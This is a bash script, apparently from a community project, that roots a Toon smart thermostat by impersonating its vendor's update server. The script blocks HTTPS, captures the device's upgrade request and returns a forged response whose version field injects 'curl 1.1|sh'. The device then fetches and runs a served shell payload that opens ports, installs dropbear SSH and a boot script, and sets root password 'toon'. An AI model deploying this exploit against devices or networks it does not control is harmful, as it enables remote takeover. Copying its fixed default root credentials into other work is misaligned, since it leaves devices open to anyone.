#!/bin/bash

#cleanup earlier bad runs
rm -f /tmp/pipe.in
rm -f /tmp/pipe.out
/sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null
killall -9 nc 2>/dev/null
killall -9 cat 2>/dev/null
# Kill any running HTTP servers
pkill -f "python3 -m http.server 8000" 2>/dev/null

#prepare payload to open port 80 on Toon so we can see logging on webserver
PAYLOAD=$'#!/bin/sh\niptables -I HCB-INPUT -p tcp --dport 80 -j ACCEPT'
PAYLOAD="$PAYLOAD ; echo \"We have connection\" > /qmf/www/rsrc/log"
if ! [ $1 ]  || [[ $EUID -ne 0 ]]
then
 echo ""
 echo "    Usage :"
 echo ""
 echo "     sudo bash $0          : without parameters gives Usage info"
 echo "     sudo bash $0 test     : performs a connectivity test"
 echo "     sudo bash $0 root     : root your toon"
 echo "     sudo bash $0 filename : sends file \"filename\" as payload"
 echo ""
 exit 0
elif [ "$1" == "test" ]
then
 clear
 echo ""
 echo "Performing test : show 2 messages on Toon and restart GUI"
 PAYLOAD="$PAYLOAD ; echo \"Do not touch the screen of your Toon\" >> /qmf/www/rsrc/log"
 PAYLOAD="$PAYLOAD ; echo \"Just wait and look at your Toon to see the GUI restart\" >> /qmf/www/rsrc/log"
 PAYLOAD="$PAYLOAD ; /qmf/bin/bxt -d :happ_usermsg -s Notification -n CreateNotification  -a type -v task -a subType -v notify -a text -v \"Restarting your GUI\" 2>/dev/null >/dev/null"
 PAYLOAD="$PAYLOAD ; sleep 2"
 PAYLOAD="$PAYLOAD ; /qmf/bin/bxt -d :happ_usermsg -s Notification -n CreateNotification  -a type -v task -a subType -v notify -a text -v \"Please wait...\" 2>/dev/null >/dev/null "
 PAYLOAD="$PAYLOAD ; sleep 2" 
 PAYLOAD="$PAYLOAD ; killall -9 qt-gui"
elif [ "$1" == "root" ]
then
 clear
 echo ""
 echo "Rooting Toon"
 # Start HTTP Server if we have a files directory
 if [ -d "files" ]; then
   echo "Setting up HTTP server to serve local files..."
   (cd files && python3 -m http.server 8000) &
   HTTP_SERVER_PID=$!
   sleep 2
   LOCAL_IP=$(hostname -I | awk '{print $1}')
   echo "HTTP server started at http://$LOCAL_IP:8000"
   
   # We'll add commands to the payload later to download these files from our server
 fi
 
 if [ -f "toon_payload" ]; then
   echo "Using local payload file"
   PAYLOAD="$PAYLOAD ; `cat toon_payload`"
 else
   echo "No local payload file found, downloading from GitHub"
   PAYLOAD="$PAYLOAD ; `curl -Nks https://raw.githubusercontent.com/ToonSoftwareCollective/Root-A-Toon/master/payload`"
 fi
 PAYLOAD="$PAYLOAD ; echo \"Your Toon is rooted, username : root ; password : toon\" >> /qmf/www/rsrc/log"
elif [ -f $1 ] 
then
 clear
 echo ""
 echo "Sending $1 to Toon"
 PAYLOAD="$PAYLOAD ; `cat $1`"
else
 clear
 echo ""
 echo "Invalid option : \"$1\""
 ./$0
 exit 0
fi
EOJ="### Reached End Of Job ###"
PAYLOAD="$PAYLOAD ; echo \"$EOJ\" >> /qmf/www/rsrc/log"

#Blocking all HTTPS (and therefore Toon VPN).
/sbin/iptables -I FORWARD -p tcp --dport 443 -j DROP

echo ""
echo "Make sure your Toon is connected to my wifi and restart your Toon."
echo ""
echo "(left top corner, Instellingen, Software, Herstart, Herstart)"
echo ""
echo "Press Enter when you see the progress bar on your Toon."
read dummy
echo "After your Toon contacted the service center you will see messages below."
echo ""
echo "When you see a message below press buttons on Toon :"
echo "  - Press the home button in top left corner."
echo "  - Press Instellingen."
echo "  - Press Software"
echo "and watch the magic happen...."
echo ""
echo "Waiting for Toon to contact the servicecenter........"
echo ""
echo "Do not touch your Toon while waiting, first wait for me to proceed..."
echo ""
echo "   or for the GUI of your Toon to be up for about 30 seconds......."
echo ""
OUTPUT=`/usr/bin/tcpdump -n -i any port 31080 -c 1 2>/dev/null` || exit "tcpdump failed"

TOONIP=`echo $OUTPUT | cut -d\  -f5 | cut -d\. -f1,2,3,4`
IP=`echo $OUTPUT | cut -d\  -f7 | cut -d\. -f1,2,3,4`

[ -f /tmp/pipe.in ] || /usr/bin/mkfifo /tmp/pipe.in
[ -f /tmp/pipe.out ] || /usr/bin/mkfifo /tmp/pipe.out

echo "The Toon from $TOONIP is connecting to servicecenter IP: $IP"

/sbin/ip addr add 1.0.0.1/32 dev lo 2>/dev/null
/sbin/ip addr add $IP/32 dev lo 2>/dev/null

RESPONSE='HTTP/1.1 200 OK\n\n

<action xmlns:u="http://schema.homeautomationeurope.com/quby" class="response" uuid="0429a450-bd0c-11e0-962b-0800200c9a66" destuuid="_DESTUUID_" destcommonname="_DESTCOMMONNAME_" requestid="_REQUESTID_" serviceid="urn:hcb-hae-com:serviceId:specific1">\n
  <u:GetUpgradeResponse xmlns:u="http://schema.homeautomationeurope.com/quby">\n
    <DoUpgrade>true</DoUpgrade>\n
    <Ver>7.;curl 1.1|sh;;</Ver>\n
    <Success>true</Success>\n
    <Reason>Success</Reason>\n
    <ReasonDetails>Success</ReasonDetails>\n
  </u:GetUpgradeResponse>\n
</action>\n
'

DONE=false

while ! $DONE 
do

echo "-------------------------------------------------------"
cat /tmp/pipe.out | nc -l -p 31080 -q 0| tee /tmp/pipe.in &

while read line
do
  if [[ $line = *"action class"* ]]
  then
    COMMONNAME=`echo $line | sed 's/.* commonname="\(.*\)".*/\1/'`
    UUID="$COMMONNAME:hcb_config" 
    REQUESTID=`echo $line | sed 's/.* requestid="\(.*\)" .*/\1/'`
    TOSEND=`echo $RESPONSE | sed "s/_REQUESTID_/$REQUESTID/" | sed "s/_DESTCOMMONNAME_/$COMMONNAME/" | sed "s/_DESTUUID_/$UUID/" `
  fi
  if [[ $line = *"<u:GetUpgrade"* ]]
  then
    echo ""
    echo "-------------------------------------------------------"
    echo "Received valid update request."
    echo "Starting payload process in background."
    echo "-------------------------------------------------------"
    
    # Modify payload to download files from our HTTP server if available
    if [ -d "files" ] && [ ! -z ${HTTP_SERVER_PID+x} ]; then
      LOCAL_IP=$(hostname -I | awk '{print $1}')
      # Prepend download commands to the payload
      DOWNLOAD_COMMANDS="cd /tmp && "
      if [ -f "files/dropbear_2015.71-r0_qb2.ipk" ]; then
        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}curl -s http://$LOCAL_IP:8000/dropbear_2015.71-r0_qb2.ipk -o dropbear_2015.71-r0_qb2.ipk && "
      fi
      if [ -f "files/dropbear_2014.66-r0_cortexa9hf-vfp-neon.ipk" ]; then
        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}curl -s http://$LOCAL_IP:8000/dropbear_2014.66-r0_cortexa9hf-vfp-neon.ipk -o dropbear_2014.66-r0_cortexa9hf-vfp-neon.ipk && "
      fi
      if [ -f "files/update-rooted.sh" ]; then
        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}curl -s http://$LOCAL_IP:8000/update-rooted.sh -o update-rooted.sh && chmod +x update-rooted.sh && "
      fi
      # Add tsc script download
      if [ -f "files/tsc" ]; then
        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}curl -s http://$LOCAL_IP:8000/tsc -o /etc/rc5.d/S99tsc.sh && chmod +x /etc/rc5.d/S99tsc.sh && mkdir -p /tmp/upload_to_toon && "
      fi
      # Download the toonstore directory 
      if [ -d "upload_to_toon/toonstore" ]; then
        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}mkdir -p /tmp/upload_to_toon/toonstore && "
        DOWNLOAD_COMMANDS="${DOWNLOAD_COMMANDS}cd /tmp/upload_to_toon && curl -s http://$LOCAL_IP:8000/toonstore_files.tar.gz -o toonstore_files.tar.gz && tar -xzf toonstore_files.tar.gz && cd /tmp && "
      fi
      
      PAYLOAD="${DOWNLOAD_COMMANDS}${PAYLOAD}"
      echo "Added commands to download files from http://$LOCAL_IP:8000"
    fi
    
    echo "Final payload:"
    echo -e $PAYLOAD
    echo "-------------------------------------------------------"
    
    timeout 80 bash -c "echo '$PAYLOAD' | nc -l -p 80 -q 2 " &
    PAYLOAD_PID=$!
    echo "Sending the response for the upgrade request."
    echo "-------------------------------------------------------"
    echo -e $TOSEND
    echo "-------------------------------------------------------"
    echo -e $TOSEND > /tmp/pipe.out
    DONE=true
  elif [[ $line = *"<u:"* ]]
  then
    echo "This is not a update request."
    echo "" > /tmp/pipe.out
  elif [[ $line = *"token"* ]]
  then
    echo "This is not a update request."
    echo "" > /tmp/pipe.out
  fi
done < /tmp/pipe.in

done

echo "The payload and response have been sent."
echo "Now waiting for the Toon to pick up the payload."
echo "Depending on the firmware of the Toon this can take a minute or so."
echo ""
echo " .... Please wait......"
echo ""

# NIET de HTTP server hier stoppen - we hebben die nodig om bestanden te downloaden
# Wacht eerst tot de payload is verwerkt
wait $PAYLOAD_PID
SUCCESS=$?
ip addr del $IP/32 dev lo
ip addr del 1.0.0.1/32 dev lo
rm -f /tmp/pipe.in
rm -f /tmp/pipe.out
/sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP

if [ $SUCCESS -ne 0 ] 
then
  echo "Response payload was not sent. Please try again"
  # Stop de HTTP server als er een fout was
  if [ ! -z ${HTTP_SERVER_PID+x} ]; then
    kill $HTTP_SERVER_PID 2>/dev/null
    echo "HTTP server stopped due to error"
  fi
  exit
fi

echo "Done sending the payload! Following the toon root log file now to see progress"
echo "HTTP server will continue running to serve files to the Toon."
sleep 2

# Verbeterde logging met interval en meer detail in de console
echo "Checking Toon log every 5 seconds. This might take a while..."
echo "All log output will be displayed in the console."
RETRY_COUNT=0
MAX_RETRIES=30  # 5 seconden x 30 = 150 seconden (2,5 minuten) maximaal wachten

while [ $RETRY_COUNT -lt $MAX_RETRIES ]
do
  CURLOUTPUT=`curl --connect-timeout 1 http://$TOONIP/rsrc/log 2>/dev/null`
  
  if [ -z "$CURLOUTPUT" ]; then
    echo "No log output received yet, retrying... ($RETRY_COUNT/$MAX_RETRIES)"
  else
    echo "-------------------------------------------------------"
    echo "Current log content (attempt $RETRY_COUNT/$MAX_RETRIES):"
    echo "$CURLOUTPUT"
    echo "-------------------------------------------------------"
    
    if echo $CURLOUTPUT | grep -q "$EOJ"; then
      echo "Root process completed successfully!"
      break
    else
      echo "Root process still in progress... (waiting 5 seconds before next check)"
    fi
  fi
  
  RETRY_COUNT=$((RETRY_COUNT+1))
  sleep 5
done

# Nu pas de HTTP server stoppen - nadat het rootproces klaar is of timeout bereikt is
if [ ! -z ${HTTP_SERVER_PID+x} ]; then
  kill $HTTP_SERVER_PID 2>/dev/null
  echo "HTTP server stopped"
fi

if [ $RETRY_COUNT -ge $MAX_RETRIES ]; then
  echo "Maximum retry count reached. The root process might still be running."
  echo "You can check the progress manually by visiting http://$TOONIP/rsrc/log in your browser"
  
  # Laatste poging om de logs te tonen
  FINAL_OUTPUT=`curl --connect-timeout 1 http://$TOONIP/rsrc/log 2>/dev/null`
  if [ ! -z "$FINAL_OUTPUT" ]; then
    echo "Latest log output:"
    echo "-------------------------------------------------------"
    echo "$FINAL_OUTPUT"
    echo "-------------------------------------------------------"
  fi
  
  echo "You can also try SSH'ing to the Toon: ssh root@$TOONIP (password: toon) if rooting was successful."
fi

echo "If root was successful, you can connect via SSH with:"
echo "  ssh root@$TOONIP"
echo "  password: toon"
echo "-------------------------------------------------------"